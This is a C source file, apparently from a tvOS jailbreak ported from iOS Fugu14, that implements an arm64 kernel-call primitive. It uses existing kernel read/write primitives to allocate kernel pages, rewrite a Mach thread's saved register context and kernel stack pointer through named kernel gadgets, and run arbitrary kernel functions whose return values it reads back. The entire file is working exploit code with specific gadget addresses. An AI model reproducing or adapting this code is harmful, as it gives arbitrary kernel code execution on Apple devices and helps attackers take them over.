// tvOS arm64_kcall port — kernel-scratch return capture (Fix A, IDA-backed).
// iOS Fugu14 used scratch @ kernelStack+0x7000 inside a 0x10000 IOSurface alloc.
// tvOS BUILD102592 Strategy B: two independent 0x4000 kalloc_pt pages — stack page +
// scratch page (kcall_return STR X0,[X19] @ 0xFFFFFFF005DE1E90).
#include "dt_kcall_arm64_tvos.h"
#include "dt_mach_thread_shim.h"

#define thread_create dt_mach_thread_create
#define thread_resume dt_mach_thread_resume
#define thread_suspend dt_mach_thread_suspend
#define thread_abort dt_mach_thread_abort

#include "kcall_arm64.h"
#include "primitives.h"
#include "translation.h"
#include "kernel.h"
#include "util.h"

#include <string.h>

uint64_t task_self(void);
uint64_t task_get_ipc_port_kobject(uint64_t task, mach_port_t port);
uint64_t ttep_self(void);
uint64_t getUserReturnThreadContext(void);
extern volatile uint64_t gUserReturnDidHappen;

#ifndef __arm64e__

#define DT_TVOS_KCALL_PAGE_SIZE     0x4000ULL
#define DT_TVOS_KCALL_SENTINEL      0x1122334455667788ULL

typedef struct {
    arm64KcallThread base;
    uint64_t stack_page_base;
    uint64_t scratch_kva;
} dtTvosKcallThread;

static dtTvosKcallThread gTvosKcallThread;
static int gTvosKcallInitResult = -999;

static dtTvosKcallThread *dt_tvos_kcall_thread(void)
{
    return &gTvosKcallThread;
}

static bool dt_tvos_kva_is_canonical(uint64_t kva)
{
    if (kva < 0x10000ULL)
        return false;
    if ((kva & 0x3FFFULL) != 0)
        return false;
    if ((kva >> 48) != 0xFFFFULL)
        return false;
    return true;
}

static bool dt_tvos_kcall_sentinel_probe(uint64_t kva)
{
    if (kwrite64(kva, DT_TVOS_KCALL_SENTINEL) != 0)
        return false;
    return kread64(kva) == DT_TVOS_KCALL_SENTINEL;
}

static int dt_tvos_kcall_allocator_init(dtTvosKcallThread *t)
{
    uint64_t stack_page_base = 0;
    uint64_t scratch_page_base = 0;
    uint64_t page_size = vm_real_kernel_page_size;

    if (page_size != DT_TVOS_KCALL_PAGE_SIZE)
        return -10;

    if (kalloc_with_options(&stack_page_base, page_size, KALLOC_OPTION_LOCAL) != 0)
        return -11;
    if (kalloc_with_options(&scratch_page_base, page_size, KALLOC_OPTION_LOCAL) != 0)
        return -12;

    if (!stack_page_base || !scratch_page_base)
        return -13;
    if (stack_page_base == scratch_page_base)
        return -14;

    t->stack_page_base = stack_page_base;
    t->base.kernelStack = stack_page_base + page_size;
    t->scratch_kva = scratch_page_base;

    if (!dt_tvos_kva_is_canonical(t->stack_page_base))
        return -15;
    if (!dt_tvos_kva_is_canonical(t->base.kernelStack))
        return -16;
    if (!dt_tvos_kva_is_canonical(t->scratch_kva))
        return -17;

    uint64_t target_sp = t->base.kernelStack - 0x20ULL;
    if (!dt_tvos_kcall_sentinel_probe(t->scratch_kva))
        return -18;
    if (!dt_tvos_kcall_sentinel_probe(target_sp))
        return -19;

    kwrite64(t->scratch_kva, 0);
    kwrite64(target_sp, 0);
    return 0;
}

void dt_tvos_kcall_get_debug(dt_tvos_kcall_debug_t *out)
{
    if (!out)
        return;
    memset(out, 0, sizeof(*out));
    dtTvosKcallThread *t = dt_tvos_kcall_thread();
    out->kernel_stack_kva = t->base.kernelStack;
    out->scratch_kva = t->scratch_kva;
    out->stack_page_base = t->stack_page_base;
    out->aligned_state_uptr = (uint64_t)(uintptr_t)t->base.alignedState;
    out->act_context_kptr = t->base.actContext;
    if (t->base.thread)
        out->thread_kptr = task_get_ipc_port_kobject(task_self(), t->base.thread);
}

static void dt_tvos_kexec_on_thread_locked(dtTvosKcallThread *callThread, kRegisterState *threadState)
{
    memcpy(callThread->base.alignedState, threadState, sizeof(*threadState));

    kRegisterState kcallBootstrapThreadState = { 0 };
    uint64_t threadKptr = task_get_ipc_port_kobject(task_self(), callThread->base.thread);

    kcallBootstrapThreadState.pc = kgadget(str_x8_x0);
    kcallBootstrapThreadState.lr = ksymbol(exception_return);
    kcallBootstrapThreadState.x[21] = phystokv(vtophys(ttep_self(), (uint64_t)callThread->base.alignedState));
    // BUILD102591: str_x8_x0 is STR X8,[X0] — X0=&machine_kstackptr, X8=kernelStack (590B)
    kcallBootstrapThreadState.x[0] = threadKptr + koffsetof(thread, machine_kstackptr);
    kcallBootstrapThreadState.x[8] = callThread->base.kernelStack;
    kcallBootstrapThreadState.cpsr = CPSR_KERN_INTR_DIS;

    kwritebuf(callThread->base.actContext, &kcallBootstrapThreadState, sizeof(kcallBootstrapThreadState));
    thread_resume(callThread->base.thread);
}

static void dt_tvos_kcall_prepare_state(dtTvosKcallThread *callThread, kRegisterState *threadState,
    uint64_t returnContextKptr)
{
    // Fix A: X19 → kernel scratch (valid kernel VA). kcall_return @ 5DE1E90: STR X0,[X19]
    threadState->x[19] = callThread->scratch_kva;
    threadState->x[21] = returnContextKptr;

    threadState->lr = kgadget(kcall_return);
    threadState->sp = callThread->base.kernelStack - 0x20;
    kwrite64(threadState->sp + 0x0, 0);
    kwrite64(threadState->sp + 0x8, 0);
    kwrite64(threadState->sp + 0x10, 0);
    kwrite64(threadState->sp + 0x18, ksymbol(exception_return));

    threadState->cpsr = CPSR_KERN_INTR_EN;
}

static uint64_t dt_tvos_kcall_on_thread(dtTvosKcallThread *callThread, uint64_t func, int argc, const uint64_t *argv)
{
    if (argc > 8)
        return (uint64_t)-1;

    pthread_mutex_lock(&callThread->base.lock);

    kwrite64(callThread->scratch_kva, 0);

    kRegisterState threadState = { 0 };
    threadState.pc = func;
    for (int i = 0; i < argc; i++)
        threadState.x[i] = argv[i];

    dt_tvos_kcall_prepare_state(callThread, &threadState, getUserReturnThreadContext());

    gUserReturnDidHappen = false;
    dt_tvos_kexec_on_thread_locked(callThread, &threadState);

    while (!gUserReturnDidHappen)
        ;

    thread_suspend(callThread->base.thread);
    thread_abort(callThread->base.thread);

    uint64_t retValue = kread64(callThread->scratch_kva);

    pthread_mutex_unlock(&callThread->base.lock);
    return retValue;
}

static uint64_t dt_tvos_kcall(uint64_t func, int argc, const uint64_t *argv)
{
    return dt_tvos_kcall_on_thread(dt_tvos_kcall_thread(), func, argc, argv);
}

static void dt_tvos_kexec(kRegisterState *threadState)
{
    dtTvosKcallThread *callThread = dt_tvos_kcall_thread();
    pthread_mutex_lock(&callThread->base.lock);
    dt_tvos_kexec_on_thread_locked(callThread, threadState);
    pthread_mutex_unlock(&callThread->base.lock);
}

int arm64_kcall_init(void)
{
    if (!gPrimitives.kalloc_local)
        return -1;
    if (!koffsetof(thread, machine_contextData))
        return -1;

    static dispatch_once_t ot;
    dispatch_once(&ot, ^{
        dtTvosKcallThread *t = dt_tvos_kcall_thread();
        pthread_mutex_init(&t->base.lock, NULL);

        thread_create(mach_task_self_, &t->base.thread);
        uint64_t threadKptr = task_get_ipc_port_kobject(task_self(), t->base.thread);
        t->base.actContext = kread_ptr(threadKptr + koffsetof(thread, machine_contextData));

        gTvosKcallInitResult = dt_tvos_kcall_allocator_init(t);
        if (gTvosKcallInitResult != 0) {
            printf("[probe] arm64_kcall_init allocator fail rc=%d stack=0x%llx scratch=0x%llx\n",
                gTvosKcallInitResult,
                (unsigned long long)t->base.kernelStack,
                (unsigned long long)t->scratch_kva);
            return;
        }

        if (posix_memalign((void **)&t->base.alignedState, vm_real_kernel_page_size, vm_real_kernel_page_size) != 0) {
            gTvosKcallInitResult = -20;
            return;
        }

        if (!dt_tvos_kva_is_canonical(t->base.kernelStack) || !dt_tvos_kva_is_canonical(t->scratch_kva)) {
            gTvosKcallInitResult = -21;
            printf("[probe] arm64_kcall_init post-alloc canonical fail stack=0x%llx scratch=0x%llx\n",
                (unsigned long long)t->base.kernelStack,
                (unsigned long long)t->scratch_kva);
            return;
        }
        gTvosKcallInitResult = 0;
        printf("[probe] arm64_kcall_init OK stack=0x%llx scratch=0x%llx act=0x%llx\n",
            (unsigned long long)t->base.kernelStack,
            (unsigned long long)t->scratch_kva,
            (unsigned long long)t->base.actContext);
    });

    if (gTvosKcallInitResult != 0)
        return gTvosKcallInitResult;

    gPrimitives.kcall = dt_tvos_kcall;
    gPrimitives.kexec = dt_tvos_kexec;

    return 0;
}

#else

int arm64_kcall_init(void)
{
    return -1;
}

void dt_tvos_kcall_get_debug(dt_tvos_kcall_debug_t *out)
{
    if (out)
        memset(out, 0, sizeof(*out));
}

#endif
